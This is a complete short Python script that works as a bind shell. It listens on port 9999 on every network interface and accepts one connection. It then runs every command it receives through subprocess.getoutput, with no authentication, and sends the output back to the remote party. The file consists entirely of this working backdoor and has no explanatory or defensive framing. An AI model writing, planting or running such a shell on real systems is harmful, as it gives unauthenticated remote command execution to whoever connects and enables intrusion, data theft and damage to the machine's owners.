import socket
import subprocess

HOST = '0.0.0.0'
PORT = 9999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)
print(f"[+] Listening on {HOST}:{PORT}")

client_socket, addr = server.accept()
print(f"[+] Connection from {addr}")

while True:
    try:
        command = client_socket.recv(1024).decode().strip()
        if command.lower() in ('exit', 'quit'):
            print("[+] Closing connection")
            break

        print(f"[+] Executing: {command}")
        output = subprocess.getoutput(command)
        if not output:
            output = "[+] Command executed with no output."

        client_socket.send(output.encode())

    except Exception as e:
        client_socket.send(f"[-] Error: {str(e)}".encode())

client_socket.close()
server.close()
